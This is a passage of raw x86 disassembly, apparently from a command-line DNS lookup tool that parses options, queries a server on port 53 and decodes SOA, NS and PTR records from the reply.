  407406:	push   0x2
  407408:	call   0x40b328
  40740d:	pop    ecx
  40740e:	pop    ecx
  40740f:	jmp    0x4074d6
  407414:	push   edx
  407415:	lea    eax,[ebp-0x208]
  40741b:	push   eax
  40741c:	push   edx
  40741d:	lea    eax,[ebp-0x108]
  407423:	push   eax
  407424:	push   0x402fe8
  407429:	push   ebx
  40742a:	call   DWORD PTR ds:0x4131a8
  407430:	add    esp,0x18
  407433:	push   0x2
  407435:	pop    esi
  407436:	test   edi,edi
  407438:	je     0x40744a
  40743a:	cmp    eax,esi
  40743c:	jne    0x40748c
  40743e:	cmp    BYTE PTR [ebp-0x208],0x3e
  407445:	jne    0x40744e
  407447:	xor    eax,eax
  407449:	inc    eax
  40744a:	cmp    eax,esi
  40744c:	jne    0x40748c
  40744e:	or     edx,0xffffffff
  407451:	lea    ecx,[ebp-0x108]
  407457:	call   0x40b7e6
  40745c:	cmp    eax,0xffffffff
  40745f:	je     0x4074d6
  407461:	cmp    eax,0xff
  407466:	jle    0x407484
  407468:	lea    eax,[ebp-0x108]
  40746e:	push   eax
  40746f:	push   0x402ff8
  407474:	push   esi
  407475:	call   0x40d391
  40747a:	pop    ecx
  40747b:	push   eax
  40747c:	call   DWORD PTR ds:0x413190
  407482:	jmp    0x4074d3
  407484:	lea    esi,[ebp-0x208]
  40748a:	jmp    0x40749c
  40748c:	cmp    eax,0x1
  40748f:	jne    0x4074c7
  407491:	mov    eax,ds:0x40e11c
  407496:	lea    esi,[ebp-0x108]
  40749c:	neg    edi
  40749e:	mov    edx,esi
  4074a0:	mov    ecx,eax
  4074a2:	sbb    edi,edi
  4074a4:	and    edi,ebx
  4074a6:	push   edi
  4074a7:	call   0x4076c9
  4074ac:	test   eax,eax
  4074ae:	je     0x4074d6
  4074b0:	mov    ecx,eax
  4074b2:	call   0x40b6bf
  4074b7:	push   eax
  4074b8:	push   esi
  4074b9:	push   0x7
  4074bb:	push   0x2
  4074bd:	call   0x40b328
  4074c2:	add    esp,0x10
  4074c5:	jmp    0x4074d6
  4074c7:	push   ebx
  4074c8:	push   0xce
  4074cd:	push   esi
  4074ce:	call   0x40b328
  4074d3:	add    esp,0xc
  4074d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4074d9:	pop    edi
  4074da:	pop    esi
  4074db:	xor    ecx,ebp
  4074dd:	pop    ebx
  4074de:	call   0x40cd10
  4074e3:	mov    esp,ebp
  4074e5:	pop    ebp
  4074e6:	ret    
  4074e7:	int3   
  4074e8:	int3   
  4074e9:	int3   
  4074ea:	int3   
  4074eb:	int3   
  4074ec:	mov    edi,edi
  4074ee:	push   ebp
  4074ef:	mov    ebp,esp
  4074f1:	sub    esp,0x20c
  4074f7:	mov    eax,ds:0x40e004
  4074fc:	xor    eax,ebp
  4074fe:	mov    DWORD PTR [ebp-0x4],eax
  407501:	push   ebx
  407502:	mov    ebx,DWORD PTR ds:0x4128fc
  407508:	lea    eax,[ebp-0x107]
  40750e:	push   esi
  40750f:	push   edi
  407510:	mov    esi,0xff
  407515:	mov    BYTE PTR [ebp-0x108],0x0
  40751c:	push   esi
  40751d:	push   0x0
  40751f:	push   eax
  407520:	mov    edi,edx
  407522:	call   0x40d4a8
  407527:	mov    ecx,ebx
  407529:	add    esp,0xc
  40752c:	lea    edx,[ecx+0x1]
  40752f:	mov    al,BYTE PTR [ecx]
  407531:	inc    ecx
  407532:	test   al,al
  407534:	jne    0x40752f
  407536:	sub    ecx,edx
  407538:	mov    edx,0x100
  40753d:	cmp    ecx,edx
  40753f:	jb     0x407551
  407541:	push   0x2f
  407543:	push   0x2
  407545:	call   0x40b328
  40754a:	pop    ecx
  40754b:	pop    ecx
  40754c:	jmp    0x4076b3
  407551:	push   edx
  407552:	lea    eax,[ebp-0x208]
  407558:	push   eax
  407559:	push   edx
  40755a:	lea    eax,[ebp-0x108]
  407560:	push   eax
  407561:	push   0x403024
  407566:	push   ebx
  407567:	call   DWORD PTR ds:0x4131a8
  40756d:	mov    ecx,eax
  40756f:	add    esp,0x18
  407572:	xor    eax,eax
  407574:	inc    eax
  407575:	test   edi,edi
  407577:	je     0x40758d
  407579:	cmp    ecx,0x2
  40757c:	jne    0x407637
  407582:	cmp    BYTE PTR [ebp-0x208],0x3e
  407589:	jne    0x407596
  40758b:	mov    ecx,eax
  40758d:	cmp    ecx,0x2
  407590:	jne    0x407637
  407596:	push   0x2d
  407598:	lea    ecx,[ebp-0x108]
  40759e:	pop    edx
  40759f:	cmp    dl,BYTE PTR [ecx]
  4075a1:	jne    0x4075b6
  4075a3:	push   0x61
  4075a5:	pop    eax
  4075a6:	cmp    al,BYTE PTR [ecx+0x1]
  4075a9:	jne    0x4075b6
  4075ab:	xor    eax,eax
  4075ad:	cmp    al,BYTE PTR [ecx+0x2]
  4075b0:	jne    0x4075b6
  4075b2:	push   0x5
  4075b4:	jmp    0x40760b
  4075b6:	lea    ecx,[ebp-0x108]
  4075bc:	cmp    dl,BYTE PTR [ecx]
  4075be:	jne    0x4075d3
  4075c0:	push   0x68
  4075c2:	pop    eax
  4075c3:	cmp    al,BYTE PTR [ecx+0x1]
  4075c6:	jne    0x4075d3
  4075c8:	xor    eax,eax
  4075ca:	cmp    al,BYTE PTR [ecx+0x2]
  4075cd:	jne    0x4075d3
  4075cf:	push   0xd
  4075d1:	jmp    0x40760b
  4075d3:	lea    ecx,[ebp-0x108]
  4075d9:	cmp    dl,BYTE PTR [ecx]
  4075db:	jne    0x4075f0
  4075dd:	push   0x6d
  4075df:	pop    eax
  4075e0:	cmp    al,BYTE PTR [ecx+0x1]
  4075e3:	jne    0x4075f0
  4075e5:	xor    eax,eax
  4075e7:	cmp    al,BYTE PTR [ecx+0x2]
  4075ea:	jne    0x4075f0
  4075ec:	push   0xf
  4075ee:	jmp    0x40760b
  4075f0:	lea    ecx,[ebp-0x108]
  4075f6:	cmp    dl,BYTE PTR [ecx]
  4075f8:	jne    0x40760e
  4075fa:	push   0x73
  4075fc:	pop    eax
  4075fd:	cmp    al,BYTE PTR [ecx+0x1]
  407600:	jne    0x40760e
  407602:	xor    eax,eax
  407604:	cmp    al,BYTE PTR [ecx+0x2]
  407607:	jne    0x40760e
  407609:	push   0xb
  40760b:	pop    eax
  40760c:	jmp    0x40762f
  40760e:	push   0x3
  407610:	lea    eax,[ebp-0x108]
  407616:	push   eax
  407617:	push   0x403030
  40761c:	call   0x40d490
  407621:	add    esp,0xc
  407624:	neg    eax
  407626:	sbb    eax,eax
  407628:	and    eax,0xffffff02
  40762d:	add    eax,esi
  40762f:	lea    esi,[ebp-0x208]
  407635:	jmp    0x407641
  407637:	cmp    ecx,eax
  407639:	jne    0x4076a3
  40763b:	lea    esi,[ebp-0x108]
  407641:	neg    edi
  407643:	mov    edx,esi
  407645:	mov    ecx,eax
  407647:	sbb    edi,edi
  407649:	and    edi,ebx
  40764b:	push   edi
  40764c:	call   0x4076c9
  407651:	test   eax,eax
  407653:	je     0x4076b3
  407655:	mov    ecx,eax
  407657:	call   0x40b6bf
  40765c:	push   eax
  40765d:	push   esi
  40765e:	push   0x7
  407660:	push   0x2
  407662:	call   0x40b328
  407667:	mov    eax,ds:0x411bf4
  40766c:	add    esp,0x10
  40766f:	mov    ecx,DWORD PTR [eax+0x8]
  407672:	test   ecx,ecx
  407674:	jne    0x40767e
  407676:	mov    eax,DWORD PTR [eax+0xc]
  407679:	mov    eax,DWORD PTR [eax]
  40767b:	mov    ecx,DWORD PTR [eax+0x8]
  40767e:	add    ecx,0x20
  407681:	call   0x40c4dc
  407686:	test   eax,eax
  407688:	jne    0x40768f
  40768a:	mov    eax,0x403034
  40768f:	push   eax
  407690:	push   esi
  407691:	push   esi
  407692:	push   0xd2
  407697:	push   0x2
  407699:	call   0x40b328
  40769e:	add    esp,0x14
  4076a1:	jmp    0x4076b3
  4076a3:	push   ebx
  4076a4:	push   0xce
  4076a9:	push   0x2
  4076ab:	call   0x40b328
  4076b0:	add    esp,0xc
  4076b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4076b6:	pop    edi
  4076b7:	pop    esi
  4076b8:	xor    ecx,ebp
  4076ba:	pop    ebx
  4076bb:	call   0x40cd10
  4076c0:	mov    esp,ebp
  4076c2:	pop    ebp
  4076c3:	ret    
  4076c4:	int3   
  4076c5:	int3   
  4076c6:	int3   
  4076c7:	int3   
  4076c8:	int3   
  4076c9:	mov    edi,edi
  4076cb:	push   ebp
  4076cc:	mov    ebp,esp
  4076ce:	sub    esp,0x338
  4076d4:	mov    eax,ds:0x40e004
  4076d9:	xor    eax,ebp
  4076db:	mov    DWORD PTR [ebp-0x8],eax
  4076de:	mov    eax,DWORD PTR [ebp+0x8]
  4076e1:	push   ebx
  4076e2:	push   esi
  4076e3:	push   edi
  4076e4:	mov    DWORD PTR [ebp-0x318],eax
  4076ea:	mov    ebx,edx
  4076ec:	xor    eax,eax
  4076ee:	mov    DWORD PTR [ebp-0x330],ebx
  4076f4:	push   0xff
  4076f9:	push   eax
  4076fa:	mov    DWORD PTR [ebp-0x31c],eax
  407700:	mov    DWORD PTR [ebp-0x32c],eax
  407706:	mov    DWORD PTR [ebp-0x324],eax
  40770c:	mov    DWORD PTR [ebp-0x320],eax
  407712:	mov    BYTE PTR [ebp-0x10c],al
  407718:	lea    eax,[ebp-0x10b]
  40771e:	push   eax
  40771f:	mov    DWORD PTR [ebp-0x338],ecx
  407725:	call   0x40d4a8
  40772a:	add    esp,0xc
  40772d:	lea    eax,[ebp-0x30c]
  407733:	xor    esi,esi
  407735:	mov    edx,0xfc
  40773a:	mov    ecx,ebx
  40773c:	mov    DWORD PTR [ebp-0x328],esi
  407742:	push   DWORD PTR ds:0x40e118
  407748:	push   0x200
  40774d:	push   eax
  40774e:	call   0x40a841
  407753:	mov    ebx,eax
  407755:	test   ebx,ebx
  407757:	jns    0x407779
  407759:	test   BYTE PTR ds:0x40e128,0x2
  407760:	je     0x407bc8
  407766:	push   0xcd
  40776b:	push   0x2
  40776d:	call   0x40b328
  407772:	pop    ecx
  407773:	pop    ecx
  407774:	jmp    0x407bc8
  407779:	mov    eax,ds:0x411bf4
  40777e:	mov    edi,DWORD PTR [eax+0x8]
  407781:	test   edi,edi
  407783:	jne    0x40778d
  407785:	mov    eax,DWORD PTR [eax+0xc]
  407788:	mov    eax,DWORD PTR [eax]
  40778a:	mov    edi,DWORD PTR [eax+0x8]
  40778d:	add    edi,0x20
  407790:	mov    ecx,0x3500
  407795:	push   0x2
  407797:	pop    edx
  407798:	movzx  eax,WORD PTR [edi]
  40779b:	cmp    ax,dx
  40779e:	jne    0x4077a4
  4077a0:	mov    WORD PTR [edi+0x2],cx
  4077a4:	cmp    eax,0x17
  4077a7:	jne    0x4077ad
  4077a9:	mov    WORD PTR [edi+0x2],cx
  4077ad:	push   0x0
  4077af:	push   0x1
  4077b1:	push   eax
  4077b2:	call   DWORD PTR ds:0x413024
  4077b8:	mov    ds:0x40e010,eax
  4077bd:	cmp    eax,0xffffffff
  4077c0:	jne    0x4077cf
  4077c2:	push   0x403044
  4077c7:	call   DWORD PTR ds:0x4130f8
  4077cd:	jmp    0x407773
  4077cf:	push   DWORD PTR [edi+0x20]
  4077d2:	push   edi
  4077d3:	push   eax
  4077d4:	call   DWORD PTR ds:0x413054
  4077da:	or     edi,0xffffffff
  4077dd:	cmp    eax,edi
  4077df:	jne    0x407806
  4077e1:	call   DWORD PTR ds:0x41302c
  4077e7:	cmp    eax,0x274d
  4077ec:	jne    0x4077f5
  4077ee:	push   0xfffffffb
  4077f0:	jmp    0x4078bf
  4077f5:	push   0x403050
  4077fa:	call   DWORD PTR ds:0x4130f8
  407800:	pop    ecx
  407801:	jmp    0x4078bd
  407806:	push   ebx
  407807:	call   DWORD PTR ds:0x413014
  40780d:	push   0x0
  40780f:	mov    WORD PTR [ebp-0x310],ax
  407816:	lea    eax,[ebp-0x310]
  40781c:	push   0x2
  40781e:	push   eax
  40781f:	push   DWORD PTR ds:0x40e010
  407825:	call   DWORD PTR ds:0x41301c
  40782b:	cmp    eax,edi
  40782d:	je     0x407baa
  407833:	push   0x0
  407835:	push   ebx
  407836:	lea    eax,[ebp-0x30c]
  40783c:	push   eax
  40783d:	push   DWORD PTR ds:0x40e010
  407843:	call   DWORD PTR ds:0x41301c
  407849:	cmp    eax,edi
  40784b:	je     0x407baa
  407851:	mov    eax,ds:0x411bf4
  407856:	cmp    DWORD PTR [eax+0x8],esi
  407859:	jne    0x407860
  40785b:	mov    eax,DWORD PTR [eax+0xc]
  40785e:	mov    eax,DWORD PTR [eax]
  407860:	mov    eax,DWORD PTR [eax]
  407862:	push   eax
  407863:	push   0x403068
  407868:	push   0x1
  40786a:	call   0x40d391
  40786f:	pop    ecx
  407870:	push   eax
  407871:	call   DWORD PTR ds:0x413190
  407877:	mov    ebx,DWORD PTR [ebp-0x318]
  40787d:	add    esp,0xc
  407880:	test   ebx,ebx
  407882:	jne    0x407893
  407884:	push   0x1
  407886:	call   0x40d391
  40788b:	pop    ecx
  40788c:	mov    ds:0x4122c0,eax
  407891:	jmp    0x40790f
  407893:	push   ecx
  407894:	lea    edx,[ebp-0x10c]
  40789a:	mov    ecx,ebx
  40789c:	call   0x40b646
  4078a1:	mov    ds:0x4122c0,eax
  4078a6:	test   eax,eax
  4078a8:	jne    0x4078d9
  4078aa:	lea    eax,[ebp-0x10c]
  4078b0:	push   eax
  4078b1:	push   0xc
  4078b3:	push   0x2
  4078b5:	call   0x40b328
  4078ba:	add    esp,0xc
  4078bd:	push   0xfffffffd
  4078bf:	pop    esi
  4078c0:	push   DWORD PTR ds:0x40e010
  4078c6:	call   DWORD PTR ds:0x413020
  4078cc:	mov    DWORD PTR ds:0x40e010,edi
  4078d2:	mov    eax,esi
  4078d4:	jmp    0x407bcb
  4078d9:	push   ebx
  4078da:	push   0x403070
  4078df:	push   eax
  4078e0:	call   DWORD PTR ds:0x413190
  4078e6:	mov    eax,ds:0x411bf4
  4078eb:	add    esp,0xc
  4078ee:	cmp    DWORD PTR [eax+0x8],esi
  4078f1:	jne    0x4078f8
  4078f3:	mov    eax,DWORD PTR [eax+0xc]
  4078f6:	mov    eax,DWORD PTR [eax]
  4078f8:	mov    eax,DWORD PTR [eax]
  4078fa:	push   eax
  4078fb:	push   0x403068
  407900:	push   DWORD PTR ds:0x4122c0
  407906:	call   DWORD PTR ds:0x413190
  40790c:	add    esp,0xc
  40790f:	mov    ebx,0x402a34
  407914:	cmp    DWORD PTR ds:0x411bf0,esi
  40791a:	jne    0x407a8d
  407920:	push   0x2
  407922:	lea    esi,[ebp-0x334]
  407928:	pop    ebx
  407929:	push   0x0
  40792b:	push   ebx
  40792c:	push   esi
  40792d:	push   DWORD PTR ds:0x40e010
  407933:	call   DWORD PTR ds:0x413028
  407939:	mov    edi,eax
  40793b:	test   edi,edi
  40793d:	je     0x407947
  40793f:	sub    ebx,edi
  407941:	add    esi,edi
  407943:	test   ebx,ebx
  407945:	jg     0x407929
  407947:	mov    esi,DWORD PTR [ebp-0x328]
  40794d:	cmp    edi,0xffffffff
  407950:	je     0x407b3e
  407956:	cmp    edi,0x2
  407959:	jb     0x407b3e
  40795f:	push   DWORD PTR [ebp-0x334]
  407965:	call   DWORD PTR ds:0x413014
  40796b:	mov    WORD PTR [ebp-0x310],ax
  407972:	test   ax,ax
  407975:	je     0x407aa1
  40797b:	mov    ecx,DWORD PTR ds:0x411be8
  407981:	movzx  ebx,ax
  407984:	cmp    ebx,ecx
  407986:	jle    0x4079b8
  407988:	test   ecx,ecx
  40798a:	je     0x4079a0
  40798c:	push   DWORD PTR ds:0x411bec
  407992:	call   DWORD PTR ds:0x413100
  407998:	mov    ax,WORD PTR [ebp-0x310]
  40799f:	pop    ecx
  4079a0:	movzx  ebx,ax
  4079a3:	push   ebx
  4079a4:	mov    DWORD PTR ds:0x411be8,ebx
  4079aa:	call   DWORD PTR ds:0x4131a4
  4079b0:	pop    ecx
  4079b1:	mov    ds:0x411bec,eax
  4079b6:	jmp    0x4079bd
  4079b8:	mov    eax,ds:0x411bec
  4079bd:	mov    DWORD PTR [ebp-0x314],eax
  4079c3:	test   ebx,ebx
  4079c5:	jle    0x4079f9
  4079c7:	mov    esi,eax
  4079c9:	push   0x0
  4079cb:	push   ebx
  4079cc:	push   esi
  4079cd:	push   DWORD PTR ds:0x40e010
  4079d3:	call   DWORD PTR ds:0x413028
  4079d9:	mov    edi,eax
  4079db:	test   edi,edi
  4079dd:	jle    0x4079e7
  4079df:	sub    ebx,edi
  4079e1:	add    esi,edi
  4079e3:	test   ebx,ebx
  4079e5:	jg     0x4079c9
  4079e7:	mov    DWORD PTR [ebp-0x314],esi
  4079ed:	mov    esi,DWORD PTR [ebp-0x328]
  4079f3:	mov    eax,DWORD PTR [ebp-0x314]
  4079f9:	cmp    edi,0xffffffff
  4079fc:	je     0x407b37
  407a02:	lea    ecx,[ebp-0x320]
  407a08:	push   ecx
  407a09:	lea    ecx,[ebp-0x31c]
  407a0f:	push   ecx
  407a10:	push   DWORD PTR [ebp-0x330]
  407a16:	push   DWORD PTR [ebp-0x338]
  407a1c:	push   eax
  407a1d:	call   0x407be3
  407a22:	mov    DWORD PTR [ebp-0x324],eax
  407a28:	test   eax,eax
  407a2a:	jne    0x407a9e
  407a2c:	cmp    DWORD PTR [ebp-0x318],eax
  407a32:	je     0x407a72
  407a34:	mov    edx,DWORD PTR [ebp-0x31c]
  407a3a:	mov    ecx,edx
  407a3c:	sub    ecx,DWORD PTR [ebp-0x32c]
  407a42:	cmp    ecx,0x32
  407a45:	jle    0x407a72
  407a47:	push   0x403078
  407a4c:	push   0x1
  407a4e:	mov    DWORD PTR [ebp-0x32c],edx
  407a54:	call   0x40d391
  407a59:	pop    ecx
  407a5a:	push   eax
  407a5b:	call   DWORD PTR ds:0x413190
  407a61:	push   0x1
  407a63:	call   0x40d391
  407a68:	push   eax
  407a69:	call   DWORD PTR ds:0x413114
  407a6f:	add    esp,0x10
  407a72:	cmp    DWORD PTR [ebp-0x320],0x2
  407a79:	jge    0x407aa1
  407a7b:	cmp    DWORD PTR ds:0x411bf0,0x0
  407a82:	je     0x407920
  407a88:	mov    ebx,0x402a34
  407a8d:	and    DWORD PTR ds:0x411bf0,0x0
  407a94:	push   ebx
  407a95:	call   DWORD PTR ds:0x413198
  407a9b:	pop    ecx
  407a9c:	jmp    0x407aa6
  407a9e:	push   0x3
  407aa0:	pop    esi
  407aa1:	mov    ebx,0x402a34
  407aa6:	mov    edi,DWORD PTR [ebp-0x318]
  407aac:	test   edi,edi
  407aae:	je     0x407add
  407ab0:	mov    ecx,DWORD PTR [ebp-0x31c]
  407ab6:	mov    edx,0x402c32
  407abb:	mov    eax,0x40307c
  407ac0:	cmp    ecx,0x1
  407ac3:	jne    0x407ac7
  407ac5:	mov    eax,edx
  407ac7:	cmp    ecx,0x32
  407aca:	jge    0x407ace
  407acc:	mov    ebx,edx
  407ace:	push   eax
  407acf:	push   ecx
  407ad0:	push   ebx
  407ad1:	push   0x21
  407ad3:	push   0x1
  407ad5:	call   0x40b328
  407ada:	add    esp,0x14
  407add:	push   DWORD PTR ds:0x40e010
  407ae3:	call   DWORD PTR ds:0x413020
  407ae9:	or     DWORD PTR ds:0x40e010,0xffffffff
  407af0:	test   edi,edi
  407af2:	je     0x407b0c
  407af4:	mov    eax,ds:0x4122c0
  407af9:	test   eax,eax
  407afb:	je     0x407b0c
  407afd:	push   eax
  407afe:	call   DWORD PTR ds:0x413158
  407b04:	and    DWORD PTR ds:0x4122c0,0x0
  407b0b:	pop    ecx
  407b0c:	sub    esi,0x0
  407b0f:	je     0x407ba6
  407b15:	sub    esi,0x1
  407b18:	je     0x407bc8
  407b1e:	sub    esi,0x1
  407b21:	je     0x407b46
  407b23:	sub    esi,0x1
  407b26:	jne    0x407bc8
  407b2c:	mov    eax,DWORD PTR [ebp-0x324]
  407b32:	jmp    0x407bcb
  407b37:	push   0x2
  407b39:	jmp    0x407aa0
  407b3e:	xor    esi,esi
  407b40:	inc    esi
  407b41:	jmp    0x407aa1
  407b46:	mov    esi,DWORD PTR ds:0x411bec
  407b4c:	push   0xd0
  407b51:	push   0x2
  407b53:	call   0x40b328
  407b58:	movzx  eax,WORD PTR [esi+0xa]
  407b5c:	pop    ecx
  407b5d:	pop    ecx
  407b5e:	push   eax
  407b5f:	call   DWORD PTR ds:0x413030
  407b65:	movzx  eax,ax
  407b68:	push   eax
  407b69:	movzx  eax,WORD PTR [esi+0x8]
  407b6d:	push   eax
  407b6e:	call   DWORD PTR ds:0x413030
  407b74:	movzx  eax,ax
  407b77:	push   eax
  407b78:	movzx  eax,WORD PTR [esi+0x6]
  407b7c:	push   eax
  407b7d:	call   DWORD PTR ds:0x413030
  407b83:	movzx  eax,ax
  407b86:	push   eax
  407b87:	movzx  eax,BYTE PTR [esi+0x3]
  407b8b:	and    eax,0xf
  407b8e:	push   DWORD PTR [eax*4+0x403478]
  407b95:	push   0xd1
  407b9a:	push   0x2
  407b9c:	call   0x40b328
  407ba1:	add    esp,0x18
  407ba4:	jmp    0x407bc8
  407ba6:	xor    eax,eax
  407ba8:	jmp    0x407bcb
  407baa:	push   0x40305c
  407baf:	call   DWORD PTR ds:0x4130f8
  407bb5:	pop    ecx
  407bb6:	push   DWORD PTR ds:0x40e010
  407bbc:	call   DWORD PTR ds:0x413020
  407bc2:	mov    DWORD PTR ds:0x40e010,edi
  407bc8:	push   0xfffffffd
  407bca:	pop    eax
  407bcb:	mov    ecx,DWORD PTR [ebp-0x8]
  407bce:	pop    edi
  407bcf:	pop    esi
  407bd0:	xor    ecx,ebp
  407bd2:	pop    ebx
  407bd3:	call   0x40cd10
  407bd8:	mov    esp,ebp
  407bda:	pop    ebp
  407bdb:	ret    0x4
  407bde:	int3   
  407bdf:	int3   
  407be0:	int3   
  407be1:	int3   
  407be2:	int3   
  407be3:	mov    edi,edi
  407be5:	push   ebp
  407be6:	mov    ebp,esp
  407be8:	sub    esp,0x288
  407bee:	mov    eax,ds:0x40e004
  407bf3:	xor    eax,ebp
  407bf5:	mov    DWORD PTR [ebp-0x4],eax
  407bf8:	mov    ecx,DWORD PTR ds:0x411bec
  407bfe:	mov    eax,DWORD PTR [ebp+0x10]
  407c01:	push   ebx
  407c02:	mov    ebx,DWORD PTR [ebp+0x14]
  407c05:	mov    DWORD PTR [ebp-0x284],eax
  407c0b:	mov    eax,DWORD PTR [ebp+0x18]
  407c0e:	push   esi
  407c0f:	mov    esi,DWORD PTR [ebp+0x8]
  407c12:	mov    DWORD PTR [ebp-0x288],eax
  407c18:	lea    eax,[ecx+0xc]
  407c1b:	mov    DWORD PTR [ebp-0x25c],esi
  407c21:	mov    DWORD PTR [ebp-0x270],ecx
  407c27:	mov    DWORD PTR [ebp-0x26c],eax
  407c2d:	push   edi
  407c2e:	mov    edi,DWORD PTR ds:0x4122c0
  407c34:	cmp    eax,esi
  407c36:	jbe    0x407c42
  407c38:	push   0x403080
  407c3d:	jmp    0x40873e
  407c42:	mov    al,BYTE PTR [ecx+0x3]
  407c45:	test   al,0xf
  407c47:	je     0x407c54
  407c49:	movzx  eax,al
  407c4c:	and    eax,0xf
  407c4f:	jmp    0x408752
  407c54:	movzx  eax,WORD PTR [ecx+0x6]
  407c58:	push   eax
  407c59:	call   DWORD PTR ds:0x413030
  407c5f:	movzx  eax,ax
  407c62:	mov    DWORD PTR [ebp-0x280],eax
  407c68:	movzx  eax,ax
  407c6b:	add    DWORD PTR [ebx],eax
  407c6d:	test   BYTE PTR ds:0x40e128,0x2
  407c74:	mov    ebx,DWORD PTR [ebp-0x270]
  407c7a:	je     0x407ca3
  407c7c:	push   eax
  407c7d:	movzx  eax,WORD PTR [ebx+0x4]
  407c81:	push   eax
  407c82:	call   DWORD PTR ds:0x413030
  407c88:	movzx  eax,ax
  407c8b:	push   eax
  407c8c:	push   0x4030bc
  407c91:	push   0x1
  407c93:	call   0x40d391
  407c98:	pop    ecx
  407c99:	push   eax
  407c9a:	call   DWORD PTR ds:0x413190
  407ca0:	add    esp,0x10
  407ca3:	cmp    WORD PTR [ebp-0x280],0x0
  407cab:	jne    0x407cb4
  407cad:	push   0xfffffffe
  407caf:	jmp    0x408751
  407cb4:	movzx  eax,WORD PTR [ebx+0x4]
  407cb8:	push   eax
  407cb9:	call   DWORD PTR ds:0x413030
  407cbf:	mov    ecx,DWORD PTR [ebp-0x26c]
  407cc5:	test   ax,ax
  407cc8:	je     0x407ce4
  407cca:	mov    edx,esi
  407ccc:	call   0x40a099
  407cd1:	test   eax,eax
  407cd3:	js     0x40874f
  407cd9:	add    ecx,0x4
  407cdc:	add    ecx,eax
  407cde:	mov    DWORD PTR [ebp-0x26c],ecx
  407ce4:	mov    eax,DWORD PTR [ebp-0x280]
  407cea:	add    eax,0xffff
  407cef:	mov    edx,esi
  407cf1:	mov    DWORD PTR [ebp-0x280],eax
  407cf7:	lea    eax,[ebp-0x214]
  407cfd:	push   0x100
  407d02:	push   eax
  407d03:	push   ecx
  407d04:	mov    ecx,ebx
  407d06:	call   0x409e47
  407d0b:	mov    DWORD PTR [ebp-0x27c],eax
  407d11:	test   eax,eax
  407d13:	js     0x408739
  407d19:	mov    ecx,DWORD PTR [ebp-0x26c]
  407d1f:	add    ecx,eax
  407d21:	mov    DWORD PTR [ebp-0x26c],ecx
  407d27:	lea    edx,[ecx+0x2]
  407d2a:	cmp    edx,esi
  407d2c:	ja     0x407c38
  407d32:	movzx  ecx,BYTE PTR [ecx]
  407d35:	mov    eax,DWORD PTR [ebp-0x26c]
  407d3b:	shl    cx,0x8
  407d3f:	movzx  ebx,cx
  407d42:	lea    ecx,[edx+0x2]
  407d45:	mov    DWORD PTR [ebp-0x268],ecx
  407d4b:	movzx  eax,BYTE PTR [eax+0x1]
  407d4f:	or     ebx,eax
  407d51:	cmp    ecx,esi
  407d53:	ja     0x407c38
  407d59:	movzx  eax,BYTE PTR [edx]
  407d5c:	shl    ax,0x8
  407d60:	movzx  eax,ax
  407d63:	mov    DWORD PTR [ebp-0x260],eax
  407d69:	movzx  eax,BYTE PTR [edx+0x1]
  407d6d:	or     DWORD PTR [ebp-0x260],eax
  407d73:	lea    eax,[ecx+0x4]
  407d76:	cmp    eax,esi
  407d78:	ja     0x407c38
  407d7e:	call   0x40a17b
  407d83:	mov    DWORD PTR [ebp-0x264],eax
  407d89:	mov    eax,DWORD PTR [ebp-0x268]
  407d8f:	lea    esi,[eax+0x6]
  407d92:	cmp    esi,DWORD PTR [ebp-0x25c]
  407d98:	ja     0x407c38
  407d9e:	movzx  ecx,BYTE PTR [eax+0x4]
  407da2:	shl    cx,0x8
  407da6:	movzx  edx,cx
  407da9:	movzx  ecx,BYTE PTR [eax+0x5]
  407dad:	or     edx,ecx
  407daf:	mov    DWORD PTR [ebp-0x274],edx
  407db5:	lea    ecx,[edx+esi*1]
  407db8:	mov    DWORD PTR [ebp-0x26c],ecx
  407dbe:	cmp    ebx,0x6
  407dc1:	jne    0x407dcb
  407dc3:	mov    eax,DWORD PTR [ebp-0x288]
  407dc9:	inc    DWORD PTR [eax]
  407dcb:	cmp    DWORD PTR [ebp+0xc],0xff
  407dd2:	je     0x407df1
  407dd4:	cmp    ebx,DWORD PTR [ebp+0xc]
  407dd7:	je     0x407df1
  407dd9:	cmp    ebx,0x2
  407ddc:	je     0x407de7
  407dde:	cmp    ebx,0xc
  407de1:	jne    0x4086fc
  407de7:	cmp    DWORD PTR [ebp+0xc],0x1
  407deb:	jne    0x4086fc
  407df1:	cmp    BYTE PTR [ebp-0x214],0x0
  407df8:	jne    0x407e14
  407dfa:	push   0x40277c
  407dff:	lea    eax,[ebp-0x214]
  407e05:	push   0x100
  407e0a:	push   eax
  407e0b:	call   DWORD PTR ds:0x413130
  407e11:	add    esp,0xc
  407e14:	test   BYTE PTR ds:0x40e128,0x2
  407e1b:	jne    0x407e6a
  407e1d:	cmp    ebx,0x6
  407e20:	je     0x407e6a
  407e22:	mov    eax,DWORD PTR [ebp-0x284]
  407e28:	cmp    BYTE PTR [eax],0x0
  407e2b:	je     0x407e6a
  407e2d:	lea    eax,[ebp-0x214]
  407e33:	push   0x2e
  407e35:	push   eax
  407e36:	call   DWORD PTR ds:0x4130f0
  407e3c:	pop    ecx
  407e3d:	pop    ecx
  407e3e:	test   eax,eax
  407e40:	je     0x407e6a
  407e42:	mov    ecx,DWORD PTR [ebp-0x284]
  407e48:	inc    eax
  407e49:	mov    edx,eax
  407e4b:	mov    DWORD PTR [ebp-0x278],eax
  407e51:	call   0x40b2d0
  407e56:	test   eax,eax
  407e58:	mov    eax,DWORD PTR [ebp-0x278]
  407e5e:	jne    0x407e33
  407e60:	test   eax,eax
  407e62:	je     0x407e6a
  407e64:	mov    BYTE PTR [eax-0x1],0x0
  407e68:	jmp    0x407e90
  407e6a:	cmp    DWORD PTR [ebp-0x27c],0xff
  407e74:	jae    0x407e90
  407e76:	push   0x40311c
  407e7b:	lea    eax,[ebp-0x214]
  407e81:	push   0x100
  407e86:	push   eax
  407e87:	call   DWORD PTR ds:0x41312c
  407e8d:	add    esp,0xc
  407e90:	lea    eax,[ebp-0x214]
  407e96:	push   eax
  407e97:	push   0x403120
  407e9c:	push   edi
  407e9d:	call   DWORD PTR ds:0x413190
  407ea3:	add    esp,0xc
  407ea6:	test   BYTE PTR ds:0x40e128,0x2
  407ead:	je     0x407ed0
  407eaf:	mov    ecx,DWORD PTR ds:0x40e118
  407eb5:	call   0x40a1a5
  407eba:	push   eax
  407ebb:	push   DWORD PTR [ebp-0x264]
  407ec1:	push   0x403128
  407ec6:	push   edi
  407ec7:	call   DWORD PTR ds:0x413190
  407ecd:	add    esp,0x10
  407ed0:	mov    ecx,ebx
